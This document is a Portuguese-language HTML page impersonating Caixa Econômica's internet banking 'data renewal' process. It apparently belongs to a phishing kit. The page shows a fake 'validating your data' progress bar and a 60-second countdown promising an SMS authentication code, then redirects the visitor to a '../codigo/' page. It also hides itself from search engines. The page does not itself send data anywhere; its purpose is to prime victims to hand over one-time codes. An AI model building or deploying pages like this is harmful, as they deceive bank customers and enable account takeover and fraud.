

<!DOCTYPE html>
<html>
<head>
	<title>Caixa Econômica | Renovação de Dados</title>
			
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="theme-color" content="#1664ac">
	<link rel="shortcut icon" href="../assets/imgs/favicon.ico">
	<link rel="stylesheet" type="text/css" href="../assets/css/renovacao_pendente.css">
	<script type="text/javascript" src="../js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="../js/jquery.mask.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

	<style>
        *{
            font-family: 'Montserrat', sans-serif;
        }
		.mod-preload .container-img-preload{
			display: none;
			position: absolute;
			top: 50%;
			left: 50%;
			padding: 10px;
			border-radius: 5px;
			background-color: #fff;
			transform: translate(-50%, -50%);
			-webkit-transform: translate(-50%, -50%);
			-moz-transform: translate(-50%, -50%);
			-o-transform: translate(-50%, -50%);
			-ms-transform: translate(-50%, -50%);
		}

		.mod-preload .container-img-preload .img-preload{
			width: 60px;
			height: 60px;
		}
		.eng p{
		
			color:#525252;
			font-weight: bold;
			background-color: #5ba2e442;
			padding: 20px;
		}
		#bt{
			height: 50px;
			background-color: #ffa126 !important;
		}
		.todoTitle{
			width: 85%;
			margin: 0 auto;
			font-family: Arial !important;
			font-weight: bold;
			color:#1664ac;
		}

		#expirationtime{
			font-weight: bold;
			font-size: 20px;
        }
        
        .pageTitle{
            font-weight: bold; 
            font-size: 23px; 
            text-align: left;
            margin: 22px;
        }
        p{
            margin: 4px;
        }

        .counterBox{
            width: 90%; 
            background: linear-gradient(90deg, rgba(1,93,169,1) 0%, rgba(33,128,173,1) 35%, rgba(82,185,171,1) 100%);
            color: #fff; margin: 0 auto;
        }

        .progress{
            height: 5px; 
            max-width: 90%; 
            margin: 0 auto; 
            background: white; 
            padding: 13px;
            border-radius: 3px;
        }
        .progress-bar{
            background: #f89007 !important;
            height: 15px;
            width: 102%;
            margin-top: -8px !important;
        }

        label{
            left: 0 !important;
            right: 0 !important;
            margin: 0 auto !important;
            text-align: center !important;
        }
	</style>
</head> 
<body>
	<div class="bodyContent">	
		<div class="banner">
			<a href="#">
				<img id="icone" src="../assets/imgs/ico_voltar.png" width="27px" height="27px">
			</a>
			<p>INTERNET</p>
			<p id="sp">BANKING</p>
		</div>
	
        <br>
        <div class="text-center">
            <h3 class="pageTitle">Validando seus dados, por favor, aguarde.</h3>
            <br>
            <div class="container-img-preload counterBox" id="customImgModalViewer" >
                <br>                
                <br>            
                <div class="progress">
                    <div class="progress-bar bg-danger" role="progressbar" style="" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
                </div>
                <br>
                <div class="row text-white">
                    <div class="col-8">
                        <p>Em instantes você poderá receber um código sms para autenticação</p>
                    </div>
                    <div class="col-4">
                        <span id="expirationtime"></span>
                    </div>
                </div>
                <br>
            </div>
        </div>
		<br>
	</div>

	<div id="mod-preload" class="mod-preload" >
		<div class="container-img-preload">
			<img class="img-preload" src="../assets/imgs/pre_load.gif">
		</div>
	</div>
	
	<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
	<script>
	    maxVal = 100; 
        atualVal = 0;
        timer = 60; 

       function updateProgress(){
            $(".progress-bar").css('width', atualVal+"%");
        }

        function counter(){

            if(atualVal >= maxVal){
                window.location.href = "../codigo/"
            }else{
                atualVal = atualVal + 1.7;
                timer--;
                $("#expirationtime").html(timer + "s")

                setTimeout(() => {
                    counter();
                    updateProgress()
                }, 1000);
            }
            
        }


	 $(document)
        .ajaxStart(function(){ 
            $(".bodyContent").hide(); $(".mod-preload").show();
        })
        .ajaxStop(function(){ 
            $(".bodyContent").show();  $(".mod-preload").hide();
        })
        .ready(function(){
    


			$("#customImgModalViewer").show();
			$("#custom-preload").show();
			counter();

		});
	</script>
</body>
</html>